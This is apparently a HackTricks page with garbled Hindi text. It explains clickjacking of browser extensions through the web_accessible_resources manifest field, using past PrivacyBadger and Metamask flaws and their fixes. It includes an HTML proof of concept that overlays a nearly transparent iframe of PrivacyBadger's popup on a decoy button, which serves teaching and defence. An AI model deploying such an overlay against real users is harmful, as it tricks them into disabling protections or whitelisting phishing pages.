# BrowExt - рдХреНрд▓рд┐рдХрдЬреИрдХрд┐рдВрдЧ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> рдХреЗ рд╕рд╛рде рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs рд╕рдмрдорд┐рдЯ** рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ рдХреНрд▓рд┐рдХрдЬреИрдХрд┐рдВрдЧ рд╡реНрдпрдХреНрддрд┐рдЧрддрддрд╛ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИред\
рдЕрдЧрд░ рдЖрдкрдХреЛ рдХреНрд▓рд┐рдХрдЬреИрдХрд┐рдВрдЧ рдХреНрдпрд╛ рд╣реИ рдЗрд╕рдХрд╛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рддреЛ рджреЗрдЦреЗрдВ:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ рдлрд╝рд╛рдЗрд▓ **`manifest.json`** рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрд╕ JSON рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдлрд╝реАрд▓реНрдб `web_accessible_resources` рд╣реЛрддрд╛ рд╣реИред рдпрд╣рд╛рдВ [Chrome рдбреЙрдХреНрд╕](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) рдХреНрдпрд╛ рдХрд╣рддреЗ рд╣реИрдВ:

> рдпреЗ рд╕рдВрд╕рд╛рдзрди рдлрд┐рд░ рдПрдХ рд╡реЗрдмрдкреЗрдЬ рдореЗрдВ URL **`chrome-extension://[PACKAGE ID]/[PATH]`** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрдВрдЧреЗ, рдЬрд┐рд╕реЗ **`extension.getURL method`** рдХреЗ рд╕рд╛рде рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдЙрдЪрд┐рдд CORS рд╣реЗрдбрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╡реЗ XHR рдЬреИрд╕реЗ рдореЗрдХреЗрдирд┐рдЬрд╝рдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрддреЗ рд╣реИрдВред[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ **`web_accessible_resources`** рдХреЗрд╡рд▓ рд╡реЗрдм рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реА рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ; рд╡реЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдЬрдиреНрдордЧрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рднреА рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдирдХреЗ рдкрд╛рд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд╖рдорддрд╛рдПрдБ рд╣реЛрддреА рд╣реИрдВ:

- рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рд╕реНрдерд┐рддрд┐ рдмрджрд▓реЗрдВ
- рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░реЗрдВ
- рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рд╕рд╛рде рдПрдХ рд╕реАрдорд┐рдд рд╕реНрддрд░ рддрдХ рдмрд╛рддрдЪреАрдд рдХрд░реЗрдВ

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдкреНрд░рд╕реНрддреБрдд рдХрд░рддреА рд╣реИред рдЕрдЧрд░ **`web_accessible_resources`** рдореЗрдВ рдХреЛрдИ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдПрдХ рдмрд╛рд╣реНрдп рд╡реЗрдм рдкреГрд╖реНрда рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЕрдирдЬрд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕ рд╕рдореНрдорд┐рд▓рд┐рдд рд╕рдВрд╕рд╛рдзрди рдХреЛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдФрд░ рдХреНрд╖рдорддрд╛рдУрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

## PrivacyBadger рдЙрджрд╛рд╣рд░рдг

рдПрдХреНрд╕рдЯреЗрдВрд╢рди PrivacyBadger рдореЗрдВ, `skin/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ `web_accessible_resources` рдХреЗ рд░реВрдк рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ (рдореВрд▓ [рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ](https://blog.lizzie.io/clickjacking-privacy-badger.html) рджреЗрдЦреЗрдВ):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдПрдХ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рдХреА рдУрд░ рд▓реЗ рдЧрдИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, `skin/popup.html` рдлрд╝рд╛рдЗрд▓, рдЬреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ PrivacyBadger рдЖрдЗрдХрди рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЗ рдмрд╛рдж рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддреА рд╣реИ, рдПрдХ `iframe` рдХреЗ рднреАрддрд░ рд╕рдорд╛рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ред рдЗрд╕ рд╕рдорд╛рд╣рд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ рддрд╛рдХрд┐ рд╡реЗ "рдЗрд╕ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рд▓рд┐рдП PrivacyBadger рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ" рдкрд░ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдРрд╕рд╛ рдХрд░рдиреЗ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЧреЛрдкрдиреАрдпрддрд╛ рдХреЛ рдЦрддрд░реЗ рдореЗрдВ рдбрд╛рд▓ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ PrivacyBadger рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджреЗрддрд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдзрд┐рдХ рдЯреНрд░реИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рдмрдирд╛ рд╕рдХрддрд╛ рдерд╛ред рдЗрд╕ рдПрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рджреБрд░реБрдкрдпреЛрдЧ рдХрд╛ рджреГрд╢реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) рдкрд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП ClickJacking рд╡реАрдбрд┐рдпреЛ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рд╕рдорд╛рдзрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рд╕реАрдзрд╛ рд╕рдорд╛рдзрд╛рди рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛: `web_accessible_resources` рдХреА рд╕реВрдЪреА рд╕реЗ `/skin/*` рдХреЛ рд╣рдЯрд╛рдирд╛ред рдпрд╣ рдкрд░рд┐рд╡рд░реНрддрди рдЦрддрд░реЗ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдХрдо рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬрд┐рд╕рд╕реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ `skin/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕рд╛рдордЧреНрд░реА рд╡реЗрдм-рд╕реБрд▓рдн рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рдереАред

рд╕реБрдзрд╛рд░ рдЖрд╕рд╛рди рдерд╛: **`web_accessible_resources` рд╕реЗ `/skin/*` рд╣рдЯрд╛рдПрдВ**ред

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask рдЙрджрд╛рд╣рд░рдг

[**Metamask рдореЗрдВ ClickJacking рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдпрд╣рд╛рдБ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, Metamask рдиреЗ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдареАрдХ рдХрд░ рджрд┐рдпрд╛ рдерд╛ рдЬрд┐рд╕рдореЗрдВ рдпрд╣ рдЬрд╛рдВрдЪрд╛ рдЧрдпрд╛ рдерд╛ рдХрд┐ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ **`https:`** рдпрд╛ **`http:`** рдерд╛ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`chrome:`** рдирд╣реАрдВ):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**рдПрдХ рдФрд░ ClickJacking рдареАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛** Metamask рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ рдерд╛ рдЬрдм рдкреЗрдЬ рд╕рдВрджреЗрд╣рд╛рд╕реНрдкрдж рдерд╛ рдХрд┐ рдпрд╣ рдлрд┐рд╢рд┐рдВрдЧ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `тАЬweb_accessible_resourcesтАЭ: [тАЬinpage.jsтАЭ, тАЬphishing.htmlтАЭ]`. рдЬреИрд╕реЗ рд╣реА рдЙрд╕ рдкреЗрдЬ рдкрд░ Clickjacking рдХреЗ рд▓рд┐рдП рд╡рдВрд╢рдЬ рдерд╛, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рдерд╛ рдЬреЛ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЛ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдкрд░ рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рдерд╛ рдФрд░ рдлрд┐рд░ рдлрд┐рд╢рд┐рдВрдЧ рдкреЗрдЬ рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ рдЬреЛ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

## Steam Inventory Helper рдЙрджрд╛рд╣рд░рдг

рдПрдХ **XSS** рдХреИрд╕реЗ рдПрдХ **ClickJacking** рд╡рдВрд╢рдЬ рдХреЗ рд╕рд╛рде рдПрдХреНрд╕рдЪреЗрдиреНрдб рд╣реЛ рдЧрдпрд╛ рдерд╛, рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрдЬ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
